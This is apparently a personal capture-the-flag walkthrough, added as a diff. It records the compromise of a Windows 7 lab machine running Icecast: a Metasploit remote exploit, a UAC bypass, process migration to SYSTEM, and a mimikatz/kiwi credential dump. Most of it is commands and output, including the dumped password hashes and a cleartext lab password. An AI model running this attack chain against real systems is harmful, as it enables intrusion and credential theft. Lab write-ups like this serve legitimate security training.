@@ -1,0 +1,166 @@
+//windows machies are less frequent thus my favorites
+
+//many ports were open and there was Icecast running on port 8000
+
+//we use metasploit exploit(windows/http/icecast_header)
+
+meterpreter > getuid
+Server username: Dark-PC\Dark
+
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+//for privEsc:
+run post/multi/recon/local_exploit_suggester
+
+// ok here I had big issues...the module was suggesting a wrong exploit
+// While this doesn't work the best on x64 machines...they said it right
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.166.226 - Collecting local exploits for x86/windows...
+[*] 10.10.166.226 - 4 exploit checks are being tried...
+[+] 10.10.166.226 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+
+//why only 4?? and why this?? 
+
+
+
+//I had to cheat...damn
+exploit(windows/local/bypassuac_eventvwr)
+
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+
+//SeTakeOwnershipPrivilege
+
+
+//we migrate to spoolsv.exe
+
+meterpreter > migrate 1260
+[*] Migrating from 1848 to 1260...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+//ah mimikatz
+meterpreter > load kiwi
+Loading extension kiwi...
+.#####.   mimikatz 2.2.0 20191125 (x64/windows)
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+'## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+'#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+
+meterpreter > help
+
+Kiwi Commands
+=============
+
+Command                Description
+-------                -----------
+creds_all              Retrieve all credentials (parsed)
+creds_kerberos         Retrieve Kerberos creds (parsed)
+creds_livessp          Retrieve Live SSP creds
+creds_msv              Retrieve LM/NTLM creds (parsed)
+creds_ssp              Retrieve SSP creds
+creds_tspkg            Retrieve TsPkg creds (parsed)
+creds_wdigest          Retrieve WDigest creds (parsed)
+dcsync                 Retrieve user account information via DCSync (unparsed)
+dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+golden_ticket_create   Create a golden kerberos ticket
+kerberos_ticket_list   List all kerberos tickets (unparsed)
+kerberos_ticket_purge  Purge any in-use kerberos tickets
+kerberos_ticket_use    Use a kerberos ticket
+kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+lsa_dump_sam           Dump LSA SAM (unparsed)
+lsa_dump_secrets       Dump LSA secrets (unparsed)
+password_change        Change the password/hash of a user
+wifi_list              List wifi profiles/creds for the current user
+wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+
+
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+
+//now we can RDP to the machine with the workstation creds:
+Dark : Password01!
+
+
+
+
+
+
